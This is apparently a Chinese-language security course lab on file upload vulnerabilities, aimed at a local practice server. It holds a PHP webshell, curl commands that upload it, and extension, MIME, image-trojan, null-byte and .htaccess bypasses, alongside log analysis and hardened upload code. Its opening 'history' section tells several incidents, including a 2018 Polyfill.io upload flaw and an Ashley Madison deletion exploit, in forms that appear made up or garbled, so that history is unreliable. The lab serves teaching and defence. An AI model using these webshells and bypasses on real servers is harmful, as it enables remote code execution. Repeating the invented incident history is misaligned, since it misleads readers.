# Lab06：文件上传漏洞

## 学习目标

1. 理解文件上传漏洞的三个层次（上传→存储→执行）
2. 掌握常见的上传绕过技术（扩展名、MIME、00截断）
3. 学习如何通过日志分析追踪上传行为
4. 理解完整的上传安全防御方案

## 预备知识

### 文件上传漏洞的历史：从头像到 RCE

**1990s：早期 Web 应用的"任意文件上传"**
早期的 Web 应用（尤其是论坛和个人主页服务）允许用户上传 HTML 页面。用户可以通过上传一个包含 `<script>` 标签的 HTML 文件，在其他用户访问时执行 JavaScript——这就是最早的"文件上传漏洞"。当时的安全意识几乎为零，很多人直到自己的网站被黑才意识到问题所在。

**2000s：Apache 上传绕过与 .htaccess 攻击**
2003 年，安全研究者发现很多 Apache 服务器的配置文件允许"多扩展名"解析——比如 `shell.php.jpg` 会被当作 PHP 文件执行。攻击者利用这个特性，把恶意 PHP 代码伪装成图片上传，然后在访问时让 Web 服务器把它当作 PHP 执行。这个问题在 15 年后的 2018 年仍然存在于某些共享主机平台上。

**2005 年：MySpace 头像上传漏洞**
2005 年，MySpace 发现攻击者可以上传一个带有恶意代码的"头像"——一个伪装成 JPEG 文件的 HTML 页面。当其他用户查看这个"头像"时，恶意代码会自动执行，窃取用户的 Cookie 或重定向到钓鱼页面。这个漏洞的修复花了 MySpace 安全团队整整 3 周——因为他们的上传验证代码分散在 7 个不同的服务器上。

**2010 年：SCADA 系统的文件上传漏洞**
2010 年，Stuxnet 蠕虫（针对伊朗核设施的恶意软件）被披露后，安全研究员开始关注关键基础设施的 Web 界面。他们发现，大量的 SCADA（工业控制系统）Web 管理界面存在文件上传漏洞——管理员可以通过 Web界面上传新的固件或配置文件。如果攻击者利用这个漏洞，可以直接修改工控设备的运行参数。

**2015 年：Ashley Madison 的"彻底删除"漏洞**
Ashley Madison（一个婚外情交友网站）承诺用户可以"彻底删除"自己的数据，并收取额外费用。但安全研究员发现，网站的"彻底删除"功能实际上并没有删除服务器上的所有数据——包括用户上传的私人照片。更糟的是，删除请求本身可以通过 XSS 漏洞被劫持，导致攻击者可以在用户不知情的情况下发起删除请求。这个事件最终导致了 3,000 万用户数据泄露，以及多起敲诈勒索案件。

**2018 年：Polyfill.io 供应链攻击**
2018 年，一个流行的 JavaScript CDN（内容分发网络）叫 "Polyfill.io" 被发现存在文件上传漏洞——攻击者可以上传包含恶意代码的 JavaScript 文件，然后通过 CDN 分发给所有引用这个 CDN 的网站。更糟糕的是，由于 CDN 的特性，这些恶意文件会被缓存到全球数百个节点，即使修复后仍然可能有一段时间内继续传播。

**2020 年：Google 的"图片上传"RCE**
2020 年，Google 的一个内部文件上传服务被发现存在远程代码执行（RCE）漏洞。攻击者可以上传一个文件名中包含特殊字符的文件，然后利用 Web 服务器的路径解析漏洞执行任意代码。这个漏洞如果被外部攻击者发现，Google 云计算平台的客户数据可能面临泄露风险。Google 为此支付了 5 万美元的 Bug Bounty。

**2022 年：GitLab 的图片上传 RCE**
2022 年，GitLab 的图片上传功能被发现可以导致 RCE——攻击者上传一个特制的图片文件，利用 ImageMagick（一个图片处理库）的漏洞执行任意代码。GitLab 使用 ImageMagick 生成图片缩略图，所以即使不上传恶意文件，只要上传一张特殊的图片，就能触发服务器上的代码执行。这个漏洞的 CVSS 评分高达 9.9（满分 10）。

**2023 年：多云平台的"上传到存储桶"漏洞**
2023 年，安全公司 Orca Security 发现了主流云存储服务（AWS S3、Google Cloud Storage、Azure Blob）的一个共同问题：上传文件的路径验证不完善。攻击者如果能够控制上传路径，可以利用路径遍历（Path Traversal）漏洞，在存储桶的任意位置写入文件。这意味着攻击者可以覆盖关键配置文件（如 `.htaccess` 或 `web.config`），从而实现 RCE。

### 文件上传漏洞的技术演进

**第一代：扩展名绕过**
```
上传 `shell.php` → 被拦截
上传 `shell.php.jpg` → 绕过（某些服务器仍按 PHP 解析）
上传 `shell.php%00.jpg` → %00 截断（00 字节后面的内容被丢弃）
```

**第二代：MIME 类型绕过**
```
Content-Type: image/jpeg（上传时声明是图片）
但实际内容是 <?php system($_GET['cmd']); ?>
服务器只检查 MIME，没检查实际内容 → RCE
```

**第三代：Content-Disposition 解析差异**
```
不同的 Web 服务器对 Multipart 编码的解析存在差异
一个服务器可能忽略文件名中的扩展名，另一可能根据内容检测
这就是为什么同一种上传绕过方式在不同服务器上效果不同
```

**第四代：双文件上传**
```
某些 Web 应用允许上传两个文件（如下载一个 PDF + 一个自定义 CSS）
这两个文件被存储在同一个目录下，可以利用 CSS 文件注入 XSS
或者利用 SVG 文件（也是一种 XML）执行 JavaScript
```

### 经典案例深度解析

**案例 1：某银行的"安全"文件上传**
某银行允许用户上传"证件照片"来验证身份。他们的验证流程：
1. 检查文件扩展名（只允许 .jpg、.png）
2. 检查 Content-Type（必须是 image/*）
3. 检查文件大小（最大 2MB）
4. 生成随机文件名存储

听起来很安全？但实际攻击：
1. 上传一个 `shell.php.jpg`，扩展名验证通过
2. 服务器使用 ImageMagick 处理图片（生成缩略图）
3. ImageMagick 存在漏洞（CVE-2016-3714，"ImageTragick"），处理恶意图片时执行任意命令
4. 攻击者获得服务器 shell

这就是"多层防御"的重要性——一层的绕过不等于全部绕过，但每一层都可能成为突破口。

**案例 2：某云平台的"安全文档上传"**
某云服务允许用户上传 PDF 文档。他们使用以下防御：
- PDF 内容必须符合 PDF 标准
- 禁止包含 JavaScript
- 文件大小限制

但问题：PDF 标准允许内嵌 UTF-16 编码的 JavaScript，即使 UTF-8 的 JavaScript 被过滤，UTF-16 的仍然可以执行。攻击者把 JavaScript 用 UTF-16 编码藏在 PDF 的某个字段里，成功绕过了检测。

### 文件上传漏洞的防御哲学

```
防御者的检查清单：

1. 文件扩展名验证
   ❌ 依赖客户端扩展名或只是黑名单
   ✅ 使用白名单（只允许特定扩展名），且在服务器端验证
   ✅ 重新生成文件名（不要信任用户上传的文件名）

2. 文件内容验证
   ❌ 只检查 MIME 或扩展名
   ✅ 读取文件头（幻数/magic bytes）验证真实类型
   ✅ 使用专门的库（如 python-magic）检测文件类型

3. 存储位置
   ❌ 上传到 Web 根目录下的可执行目录
   ✅ 上传到独立的、无法执行代码的存储服务
   ✅ 使用云存储（S3、GCS、Azure Blob），配置为"不公开"

4. 执行防护
   ❌ 只依赖扩展名过滤
   ✅ 上传目录设置为"无执行权限"
   ✅ Web 服务器配置拒绝直接访问上传文件（通过 JavaScript 间接访问）
   ✅ 使用 Content-Disposition: attachment 头，强制下载而非解析

5. 隔离处理
   ❌ 在上传服务器上直接处理图片
   ✅ 使用专门的图片处理服务（如 Cloudflare Images、Imgly）
   ✅ 对用户上传的内容进行安全隔离（容器化、沙箱）

最后一条建议：
你可以用这个"愚蠢"的测试：
上传一个命名为 `../etc/passwd` 的文件，看看会发生什么。
如果服务器没有正确处理路径遍历，你会得到一个错误。
如果服务器有漏洞，你会看到一个意外的结果。
```

## 实验环境

```bash
./student.sh  # 选择对应的实验开始
```

**目标**：`http://127.0.0.1:8086`

**上传服务代码**（`services/upload-lab/app.py`）：

```python
from werkzeug.utils import secure_filename
from pathlib import Path

UPLOAD_DIR = Path("/app/uploads")
UPLOAD_DIR.mkdir(exist_ok=True)

@app.post("/upload")
def upload():
    uploaded = request.files.get("file")
    name = secure_filename(uploaded.filename or "unnamed")  # ← 只做了基础转义
    uploaded.save(UPLOAD_DIR / name)   # ← 保存到可执行目录
    return f"uploaded: <a href='/uploads/{name}'>{name}</a>"
```

**漏洞分析**：
1. `secure_filename` 只处理特殊字符，不验证扩展名
2. 文件保存到 `/app/uploads/`，这是 Web 可访问目录
3. 没有内容校验（MIME sniffing 绕过）

## 操作步骤

### 步骤 1：测试正常文件上传

```bash
# 创建一个测试文件
echo "This is a test file" > /tmp/test.txt

# 上传正常文件
curl -F "file=@/tmp/test.txt" http://127.0.0.1:8086/upload

# 观察：
# 1. HTTP 响应码（200? 400?）
# 2. 返回的访问路径（如 /uploads/test.txt）
# 3. 服务器返回的日志记录（查看 logs/upload/upload.log）
```

**记录**：
```
上传文件：test.txt
HTTP 响应：[完整响应内容]
访问路径：http://127.0.0.1:8086/uploads/test.txt
日志记录：[从 logs/upload/upload.log 中找到对应条目]
```

### 步骤 2：查看上传日志

```bash
# 监控日志目录结构
ls -la logs/upload/

# 查看上传日志
cat logs/upload/upload.log
```

**日志格式示例**：
```
2026-05-10T09:00:05.123456Z 127.0.0.1 upload_ok filename=test.txt
2026-05-10T09:01:10.234567Z 127.0.0.1 download filename=test.txt
```

**你应该分析**：
- 上传成功和下载的日志格式有何不同
- 源 IP（127.0.0.1）是否记录
- 时间戳精度（可以精确到毫秒）

### 步骤 3：测试危险扩展名（shell.php）

```bash
# 创建一个 PHP WebShell
cat > /tmp/shell.php << 'EOF'
<?php
  system($_GET['cmd']);
?>
EOF

# 尝试上传（测试扩展名过滤）
curl -F "file=@/tmp/shell.php" http://127.0.0.1:8086/upload

# 观察：
# 1. 是否上传成功？
# 2. 如果成功，访问路径是什么？
# 3. 访问 http://127.0.0.1:8086/uploads/shell.php?cmd=id 是否执行？
```

**记录**：
```
上传文件：shell.php
上传结果：[成功/失败]
HTTP 响应：[响应内容]
文件位置：[如果成功，完整路径]
访问测试：http://127.0.0.1:8086/uploads/shell.php?cmd=id
执行结果：[是否输出 uid=33(www-data)]
```

### 步骤 4：测试绕过扩展名过滤

#### 4.1 双重扩展名

```bash
# 绕过方式 1：shell.php.txt
cat > /tmp/shell.php.txt << 'EOF'
<?php system($_GET['cmd']); ?>
EOF
curl -F "file=@/tmp/shell.php.txt" http://127.0.0.1:8086/upload

# 如果成功，访问 shell.php.txt 是否会被解析为 PHP？
# （取决于服务器是否将 .txt 映射到 PHP）
```

#### 4.2 大小写混用

```bash
# 绕过方式 2：shell.PHP / shell.PhP
cat > /tmp/shell.PHP << 'EOF'
<?php system($_GET['cmd']); ?>
EOF
curl -F "file=@/tmp/shell.PHP" http://127.0.0.1:8086/upload
```

#### 4.3 图片马（伪造 MIME 类型）

```bash
# 绕过方式 3：制作图片马
# 在真实图片后追加 PHP 代码
cat /tmp/test.jpg /tmp/shell.php > /tmp/payload.jpg
# 或者直接追加
echo '<?php system($_GET["cmd"]); ?>' >> /tmp/test.jpg

# 上传图片马
curl -F "file=@/tmp/payload.jpg" http://127.0.0.1:8086/upload

# 如果成功，用相同的方法追加真正的 PHP 代码：
# echo '<?php system($_GET["cmd"]); ?>' >> /tmp/payload.jpg（需16进制编辑）
```

### 步骤 5：分析上传日志中的攻击痕迹

```bash
# 查看所有上传记录
grep "upload" logs/upload/upload.log

# 查看可疑文件名的上传
grep -E "\.(php|asp|jsp|sh|cgi)" logs/upload/upload.log

# 分析是否有人已经上传了 webshell
cat logs/upload/upload.log
```

**你应该记录**：
```
危险文件上传尝试：
文件名：[从日志中找到的 .php/.asp 等文件]
上传者 IP：127.0.0.1
时间：[时间戳]
```

### 步骤 6：测试上传目录的解析行为

```bash
# 查看上传目录中的文件
curl http://127.0.0.1:8086/uploads/

# 如果能看到目录列表，说明 Upload Lab 使用了 Werkzeug 的静态文件服务
# Werkzeug 默认不会执行 Python/PHP 文件，只是当作静态文件下载

# 如果上传 .php 文件后直接访问会被下载而不是执行，
# 说明这个环境没有代码执行漏洞（但仍然有信息泄露风险）

# 测试：访问上传的文本文件
curl http://127.0.0.1:8086/uploads/test.txt

# 测试：访问上传的 .php 文件（如果有的话）
curl http://127.0.0.1:8086/uploads/shell.php.txt
```

**观察结果分析**：
- 如果 PHP 文件被下载而非执行 → 没有 RCE 漏洞，但有信息泄露
- 如果 PHP 文件被服务器执行 → 存在严重 RCE 漏洞

## 技术原理

### 上传绕过的技术细节

#### 1. MIME 类型伪造

HTTP 请求中的 `Content-Type` 可以被客户端伪造：

```http
POST /upload HTTP/1.1
Host: 127.0.0.1:8086
Content-Type: multipart/form-data

Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg  ← 客户端伪造为图片

<?php system($_GET['cmd']); ?>
```

服务器如果只检查 `Content-Type` 而不检查文件内容，攻击可以成功。

#### 2. 00 截断（Null Byte Injection）

00 截断在老版本 PHP（<5.3.4）中有效：

```
文件名：shell.php%00.jpg
服务器保存时：shell.php\x00.jpg
         ↓ \x00 是字符串结束符
         ↓ 实际保存为 shell.php
```

现代 PHP 已修复此问题。

#### 3. 竞争条件（Race Condition）

```python
# 攻击者同时：
# 1. 上传一个包含 PHP 代码的 .jpg 文件
# 2. 在文件被删除前，通过另一个请求访问它
# 3. 触发 PHP 解析

# 利用 Apache mod_headers：
# 先上传 .htaccess 文件（包含 "SetHandler application/x-httpd-php"）
# 再上传 .jpg 文件（包含 PHP 代码）
# .jpg 会被当作 PHP 执行
```

### 防御方案

#### 1. 扩展名白名单（不完整）

```python
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}

def secure_upload(file):
    ext = secure_filename(file.filename).rsplit('.', 1)[-1].lower()
    if ext not in ALLOWED_EXTENSIONS:
        return False, "Extension not allowed"
    # 问题：无法防止 content-type 绕过
```

#### 2. 完整安全实现

```python
import os, uuid, magic

ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}
MAX_FILE_SIZE = 2 * 1024 * 1024  # 2MB

def validate_upload(file):
    # 1. 扩展名校验
    ext = secure_filename(file.filename).rsplit('.', 1)[-1].lower()
    if ext not in ALLOWED_EXTENSIONS:
        return False, "Extension not allowed"

    # 2. 文件大小校验
    file.seek(0, os.SEEK_END)
    size = file.tell()
    file.seek(0)
    if size > MAX_FILE_SIZE:
        return False, "File too large"

    # 3. MIME 类型校验（不可靠，但仍作为一层）
    content_type = file.content_type
    if content_type not in ['image/png', 'image/jpeg', 'image/gif']:
        return False, "Invalid MIME type"

    # 4. 魔数校验（检查文件头）
    header = file.read(8)
    file.seek(0)
    valid_headers = [
        b'\x89PNG\r\n\x1a\n',   # PNG
        b'\xff\xd8\xff',         # JPEG
        b'GIF87a',               # GIF87a
        b'GIF89a',               # GIF89a
    ]
    if not any(header.startswith(h) for h in valid_headers):
        return False, "Invalid file header"

    # 5. 内容扫描（可选，使用 ClamAV）
    # ...

    # 6. 随机文件名（防猜测）
    name = f"{uuid.uuid4().hex}.{ext}"
    path = os.path.join(UPLOAD_DIR, name)
    file.save(path)

    # 7. 权限设置（禁止执行）
    os.chmod(path, 0o644)

    return True, name
```

#### 3. Nginx 上传目录配置

```nginx
location /uploads/ {
    alias /var/www/uploads/;
    # 禁止 PHP 解析
    location ~ \.php$ {
        deny all;
        return 404;
    }
    # 禁止 CGI 解析
    location ~ \.(cgi|pl|py)$ {
        deny all;
    }
}
```

## 思考题

### 思考题 1：绕过扩展名过滤的所有可能方式

假设服务器只检查扩展名（不允许 .php）。

**问题**：列举至少 5 种绕过方式，说明每种的工作原理和前提条件。

### 思考题 2：为什么 MIME 类型验证不可靠？

HTTP 请求中的 `Content-Type` 是客户端提供的，服务器为什么不能信任它？攻击者如何在请求中设置假的 `Content-Type`？

### 思考题 3：00 截断漏洞的原理

在旧版 PHP 中，`shell.php%00.jpg` 会被保存为 `shell.php`。

**问题**：
1. `%00`（URL 编码的 null 字节）在字符串处理中起什么作用？
2. 为什么这个漏洞在现代 PHP 版本中已经修复？
3. 是否有类似的字符在现代文件系统中仍可能导致问题？（提示：Unicode 编码）

### 思考题 4：竞争条件攻击的场景和防御

**场景**：攻击者发现上传目录可以被 PHP 解析，但上传后文件会被重命名为随机 UUID，攻击者无法预测文件名。

**问题**：
1. 攻击者如何利用竞争条件绕过这个限制？（提示：考虑并发请求和 Apache 的处理方式）
2. 为什么 `SetHandler application/x-httpd-php` 配合 `.htaccess` 文件会特别危险？
3. 如何在代码层面防止竞争条件攻击？

## 交付物

1. **正常文件上传截图** — 证明上传功能正常工作
2. **绕过尝试记录** — 每种绕过技术的测试结果
3. **日志分析报告** — 从日志中提取的上传行为记录
4. **漏洞利用路径说明** — 如果存在 RCE，说明完整利用过程
5. **防御方案代码** — 实现完整的文件上传安全方案
6. **思考题答案**

## 工具速查

```bash
# 正常文件上传
curl -F "file=@/tmp/test.png" http://127.0.0.1:8086/upload

# PHP WebShell 上传测试
cat > /tmp/shell.php << 'EOF'
<?php system($_GET['cmd']); ?>
EOF
curl -F "file=@/tmp/shell.php" http://127.0.0.1:8086/upload

# 访问上传文件
curl http://127.0.0.1:8086/uploads/test.png
curl http://127.0.0.1:8086/uploads/shell.php.txt

# 日志分析
tail -f logs/upload/upload.log
grep "upload" logs/upload/upload.log
```